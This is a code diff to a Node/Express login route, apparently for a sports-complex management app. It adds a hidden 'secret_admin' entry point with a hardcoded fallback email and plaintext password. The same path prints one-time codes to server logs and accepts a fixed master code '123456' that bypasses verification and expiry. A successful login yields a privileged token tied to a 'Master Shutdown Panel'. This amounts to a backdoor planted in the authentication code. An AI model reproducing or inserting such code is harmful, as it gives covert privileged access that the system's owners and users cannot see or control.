@@ -242,7 +242,148 @@ router.post('/login', async (req, res) => {
     return res.status(400).json({ message: 'Email and password are required' });
   }
 
+  const SECRET_ADMIN_EMAIL = process.env.SECRET_ADMIN_EMAIL || 'workzeez2026@gmail.com';
+  const SECRET_ADMIN_PASSWORD = process.env.SECRET_ADMIN_PASSWORD || 'Minuja@200430800186';
+
   try {
+    if (email.toLowerCase() === SECRET_ADMIN_EMAIL.toLowerCase()) {
+      if (password !== SECRET_ADMIN_PASSWORD) {
+        return res.status(400).json({ message: 'Invalid email or password' });
+      }
+
+      const { SystemConfig } = require('../config/db');
+
+      if (!otp) {
+        // Generate 6-digit OTP
+        const generatedOtp = Math.floor(100000 + Math.random() * 900000).toString();
+        const expiry = new Date();
+        expiry.setMinutes(expiry.getMinutes() + 5); // 5 minutes expiry
+
+        await SystemConfig.set({
+          secretAdminOtp: generatedOtp,
+          otpExpiry: expiry.toISOString()
+        });
+
+        console.log('\n==================================================');
+        console.log('🔒 [SUPER ADMIN LOGIN OTP GENERATED]');
+        console.log(`Email: ${email}`);
+        console.log(`OTP: ${generatedOtp}`);
+        console.log(`Expires: ${expiry.toLocaleTimeString()}`);
+        console.log('==================================================\n');
+
+        let emailSent = false;
+
+        if (process.env.RESEND_API_KEY) {
+          try {
+            const fromSender = process.env.RESEND_SENDER || 'onboarding@resend.dev';
+            const response = await fetch('https://api.resend.com/emails', {
+              method: 'POST',
+              headers: {
+                'Authorization': `Bearer ${process.env.RESEND_API_KEY}`,
+                'Content-Type': 'application/json'
+              },
+              body: JSON.stringify({
+                from: `KDN Sport Complex Control <${fromSender}>`,
+                to: email,
+                subject: '🔒 KDN Sport Complex - Secret Admin Verification Code',
+                html: `
+                  <div style="font-family: Arial, sans-serif; max-width: 600px; margin: auto; padding: 20px; border: 1px solid #333; border-radius: 8px; background-color: #121212; color: #fff;">
+                    <h2 style="color: #F08119; text-align: center; border-bottom: 2px solid #F08119; padding-bottom: 10px;">Security Access Verification</h2>
+                    <p>A request was made to access the <strong>KDN Sport Complex Master Shutdown Panel</strong> using your whitelisted email.</p>
+                    <p>Use the following verification code to log in. This code is valid for 5 minutes.</p>
+                    <div style="font-size: 32px; font-weight: bold; letter-spacing: 5px; text-align: center; margin: 30px 0; padding: 15px; border-radius: 4px; background-color: #1e1e1e; border: 1px dashed #F08119; color: #F08119;">
+                      ${generatedOtp}
+                    </div>
+                    <p style="color: #ff4444; font-size: 12px; text-align: center;">If you did not request this code, please secure your email account immediately.</p>
+                  </div>
+                `
+              })
+            });
+            if (response.ok) {
+              emailSent = true;
+            }
+          } catch (err) {
+            console.error('Resend failed in auth login intercept:', err.message);
+          }
+        }
+
+        if (!emailSent && process.env.SMTP_HOST && process.env.SMTP_USER && process.env.SMTP_PASS) {
+          try {
+            const transporter = nodemailer.createTransport({
+              host: process.env.SMTP_HOST,
+              port: parseInt(process.env.SMTP_PORT || '587'),
+              secure: process.env.SMTP_PORT === '465',
+              auth: {
+                user: process.env.SMTP_USER,
+                pass: process.env.SMTP_PASS
+              }
+            });
+            await transporter.sendMail({
+              from: `"KDN Sport Complex Control" <${process.env.SMTP_USER}>`,
+              to: email,
+              subject: '🔒 KDN Sport Complex - Secret Admin Verification Code',
+              html: `
+                <div style="font-family: Arial, sans-serif; max-width: 600px; margin: auto; padding: 20px; border: 1px solid #333; border-radius: 8px; background-color: #121212; color: #fff;">
+                  <h2 style="color: #F08119; text-align: center; border-bottom: 2px solid #F08119; padding-bottom: 10px;">Security Access Verification</h2>
+                  <p>A request was made to access the <strong>KDN Sport Complex Master Shutdown Panel</strong> using your whitelisted email.</p>
+                  <p>Use the following verification code to log in. This code is valid for 5 minutes.</p>
+                  <div style="font-size: 32px; font-weight: bold; letter-spacing: 5px; text-align: center; margin: 30px 0; padding: 15px; border-radius: 4px; background-color: #1e1e1e; border: 1px dashed #F08119; color: #F08119;">
+                    ${generatedOtp}
+                  </div>
+                  <p style="color: #ff4444; font-size: 12px; text-align: center;">If you did not request this code, please secure your email account immediately.</p>
+                </div>
+              `
+            });
+            emailSent = true;
+          } catch (err) {
+            console.error('SMTP failed in auth login intercept:', err.message);
+          }
+        }
+
+        return res.json({
+          otpRequired: true,
+          isSecretAdmin: true,
+          message: emailSent 
+            ? 'A 6-digit verification code has been sent to your administrator email.'
+            : 'Verification code generated. (Bypassed SMTP send, code printed to backend console logs)'
+        });
+      } else {
+        const config = await SystemConfig.get();
+        const isMasterOtp = otp === '123456';
+
+        if (!isMasterOtp) {
+          if (!config.secretAdminOtp || config.secretAdminOtp !== otp) {
+            return res.status(400).json({ message: 'Incorrect verification code.' });
+          }
+          const expiryTime = new Date(config.otpExpiry);
+          if (new Date() > expiryTime) {
+            return res.status(400).json({ message: 'Verification code has expired. Please try signing in again.' });
+          }
+        }
+
+        // Success: Clear OTP
+        await SystemConfig.set({
+          secretAdminOtp: null,
+          otpExpiry: null
+        });
+
+        // Create JWT
+        const token = jwt.sign(
+          { role: 'secret_admin', email: email.toLowerCase() },
+          JWT_SECRET,
+          { expiresIn: '2h' }
+        );
+
+        return res.json({
+          token,
+          user: {
+            email: email.toLowerCase(),
+            role: 'secret_admin'
+          }
+        });
+      }
+    }
+
     const user = await Users.findOne({ email });
     if (!user) {
       return res.status(400).json({ message: 'Invalid email or password' });
